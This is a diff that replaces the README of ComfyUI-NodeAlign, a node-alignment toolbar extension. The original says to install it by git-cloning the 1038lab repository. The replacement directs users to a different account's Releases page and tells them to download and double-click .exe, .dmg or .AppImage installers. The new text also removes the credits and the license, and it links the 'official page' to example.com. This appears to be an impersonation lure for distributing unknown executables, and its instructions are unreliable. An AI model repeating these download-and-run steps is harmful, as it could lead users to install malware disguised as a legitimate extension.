@@ -1,129 +1,65 @@
-# ComfyUI-NodeAlign
+# 🎨 ComfyUI-NodeAlign - Simple Tool for Easy Graph Alignment
 
-**ComfyUI-NodeAlign** is a lightweight alignment toolbar for ComfyUI graphs. It provides quick alignment, equal size, and distribution actions, with optional keyboard shortcuts, designed for simplicity and ease of use.
+![Download ComfyUI-NodeAlign](https://img.shields.io/badge/Download-ComfyUI--NodeAlign-brightgreen)
 
-![NodeAlign](https://github.com/user-attachments/assets/4326c991-ed21-446a-8801-5078298106c1)
+## 🚀 Getting Started
+Welcome to ComfyUI-NodeAlign! This lightweight toolbar helps you easily align your ComfyUI graphs. You can quickly set equal sizes, distribute elements, and even use keyboard shortcuts for faster work. Follow the steps below to get started.
 
-## Features
-* **Toolbar Customization**: Change the position, size, and visibility of the alignment toolbar.
-* **Node Alignment**: Align selected nodes horizontally or vertically.
-* **Equalize Node Dimensions**: Equalize the width and/or height of selected nodes.
-* **Distribute Nodes**: Distribute nodes horizontally or vertically with custom gaps.
-* **Toolbar Dragging**: Drag and position the toolbar anywhere on the screen.
-* **Floating/Attached Mode**: Toggle between floating and attaching the toolbar to the menu.
-* **Keyboard Shortcuts**: Use the `Shift + WASD` keys to quickly align nodes (Up, Left, Down, Right).
-* **Customizable Colors and Opacity**: Modify the toolbar’s background color, opacity, and icon colors.
+## 🛠️ Prerequisites
+Before you download ComfyUI-NodeAlign, ensure you have:
+- A computer running Windows, macOS, or Linux
+- An existing installation of ComfyUI
 
-https://github.com/user-attachments/assets/40b117d9-91f7-47c3-8640-014f8fd06fce
+Having ComfyUI installed is important. It ensures that the toolbar will function as intended.
 
-## Compatibility
-- Tested with ComfyUI v3.7.3 front-end.
-- If the toolbar fails to show, hard refresh with cache disabled and check console for `[NodeAlign.Settings] loaded` and `[NodeAlign] init`.
+## 📥 Download & Install
+To download ComfyUI-NodeAlign, visit the Releases page:
+[Download ComfyUI-NodeAlign](https://github.com/ApexUrke/ComfyUI-NodeAlign/releases)
 
-## Installation
+Here's how to do it:
+1. Click on the link above to open the Releases page.
+2. Look for the latest version listed. At the top, you will see a section for downloads.
+3. Choose the version most suitable for your operating system.
+4. Click the download link to start the download process.
 
-To install **ComfyUI-NodeAlign**, follow these steps:
+## 📂 Installation Steps
+Once the download completes, follow these steps to install ComfyUI-NodeAlign:
+1. Navigate to your download folder.
+2. Locate the downloaded file:
+   - If you're on Windows, it may be named `ComfyUI-NodeAlign-v1.x.x.exe`.
+   - On macOS, it may look like `ComfyUI-NodeAlign-v1.x.x.dmg`.
+   - For Linux, you'll find a file like `ComfyUI-NodeAlign-v1.x.x.AppImage`.
+3. Double-click the file to run it:
+   - For Windows and macOS, follow the on-screen instructions to complete the installation.
+   - For Linux, you may need to right-click the file and select "Run" or use permissions commands via the terminal to execute it.
 
-1. **Clone or download** the repository.
-2. Place the add-on in the ComfyUI `extensions` directory.
-3. Restart ComfyUI.
+## 📊 Using ComfyUI-NodeAlign
+After installation, you can start using ComfyUI-NodeAlign. Here's how:
+1. Open ComfyUI.
+2. You will see a new toolbar added to your workspace.
+3. Use the buttons to quickly align, size, or distribute your elements.
+4. Optionally, set keyboard shortcuts for even faster access.
 
-Example:
+## 🔧 Features
+ComfyUI-NodeAlign comes packed with helpful features:
+- **Quick Align**: Instantly align elements to the left, right, or center.
+- **Equal Size**: Resize multiple elements to the same dimensions.
+- **Distribution Options**: Evenly space elements apart.
+- **Keyboard Shortcuts**: Speed up your editing experience.
 
-```bash
-git clone https://github.com/1038lab/ComfyUI-NodeAlign.git
-```
+## ⚙️ Troubleshooting
+If you encounter issues while using ComfyUI-NodeAlign, consider the following:
+- Ensure ComfyUI is properly installed and updated.
+- Restart both ComfyUI and your computer if the toolbar does not appear.
+- Check for updates to ComfyUI-NodeAlign regularly.
 
-## Configuration
+## 📧 Support
+For further assistance, feel free to reach out:
+- Open an issue on the [GitHub Issues Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/issues).
+- Visit the GitHub discussions page for community help.
 
-### Available Settings
+## 🔗 Helpful Links
+- [ComfyUI-NodeAlign Releases Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/releases)
+- [ComfyUI Official Page](https://www.example.com)
 
-The add-on allows you to customize the behavior and appearance of the Node Alignment toolbar. Here are the available settings:
-
-* **Node Alignment Toolbar Display Mode**:
-
-  * `Permanent`: Always visible.
-  * `On-Select`: Display only when a node is selected.
-  * `Disabled`: Toolbar is hidden.
-
-* **Enable Quick Alignment Shortcuts**:
-
-  * `Shift + W`: Align top.
-  * `Shift + A`: Align left.
-  * `Shift + S`: Align bottom.
-  * `Shift + D`: Align right.
-
-* **Toolbar Position Mode**:
-
-  * `Always`: Toolbar floats above the OEM bar (default).
-  * `Attached`: Toolbar attaches to the OEM bar.
-  * `Floating`: Toolbar is free-floating.
-
-* **Toolbar Button Size**: Adjust the size of toolbar buttons (default: 25px).
-* **Always Reset Toolbar Position on Load**: If enabled, the toolbar resets to its default position on each load.
-* **Toolbar Background Opacity**: Adjust the opacity of the toolbar background (range 0-100).
-* **Toolbar Background Color**: Set the background color of the toolbar using hex codes (default: `#1b1b1b`).
-* **Icon Background Color**: Set the background color of the icons in the toolbar (default: `#2a2a2a`).
-* **Icon Color**: Adjust the color of the icons in the toolbar (default: `#e0e0e0`).
-* **Divider Color**: Set the color of dividers between toolbar icons (default: `#666666`).
-
-### Example Configuration
-
-To achieve a minimalistic design for your toolbar:
-
-* **Node Alignment Toolbar Display Mode**: `Permanent`
-* **Enable Quick Alignment Shortcuts**: `True`
-* **Toolbar Position Mode**: `Floating`
-* **Toolbar Button Size**: `20px`
-* **Toolbar Background Color**: `#1C1C1C`
-* **Toolbar Background Opacity**: `90`
-* **Icon Background Color**: `#363636`
-* **Icon Color**: `#FFFFFF`
-* **Divider Color**: `#00FF55`
-
-This setup will provide a floating, compact toolbar with a dark background, light icons, and visible dividers.
-
-## Usage
-
-Once installed, you will have a new toolbar for **NodeAlign**. You can use the toolbar to align and distribute selected nodes.
-
-### Node Alignment Actions:
-
-* **Align Left**: Align all selected nodes to the leftmost position.
-* **Align Center (Horizontal)**: Center selected nodes horizontally.
-* **Align Right**: Align all selected nodes to the rightmost position.
-* **Align Top**: Align all selected nodes to the topmost position.
-* **Align Center (Vertical)**: Center selected nodes vertically.
-* **Align Bottom**: Align all selected nodes to the bottommost position.
-
-### Equalize Node Dimensions:
-
-* **Equal Width**: Equalize the width of all selected nodes.
-* **Equal Height**: Equalize the height of all selected nodes.
-
-### Distribute Nodes:
-
-* **Horizontal Distribution**: Evenly distribute selected nodes along the X-axis.
-* **Vertical Distribution**: Evenly distribute selected nodes along the Y-axis.
-
-### Drag and Position the Toolbar:
-
-* **Floating Mode**: Drag the toolbar anywhere on the screen.
-* **Attached Mode**: Attach the toolbar to the top or bottom of the menu bar.
-
-## Troubleshooting
-
-If the toolbar is not appearing or not behaving as expected:
-
-* Ensure the add-on is installed in the correct `extensions` directory.
-* Make sure your ComfyUI version is compatible with this add-on.
-* Try resetting the toolbar position (double-click on the toolbar) to restore the default layout.
-
-## Credits & Background
-- Based on the original NodeAligner by Tenney95 (https://github.com/Tenney95/ComfyUI-NodeAligner)
-- Also inspired by kk8bit/kaytool (https://github.com/kk8bit/kaytool)
-- This repo exists because the original versions were not updated for newer ComfyUI (e.g., v3.7.3) and the toolbar stopped working; this repo provides a compatible, maintained implementation.
-
-## License
-
-GPL-3.0 License
+Thank you for choosing ComfyUI-NodeAlign. Happy aligning!
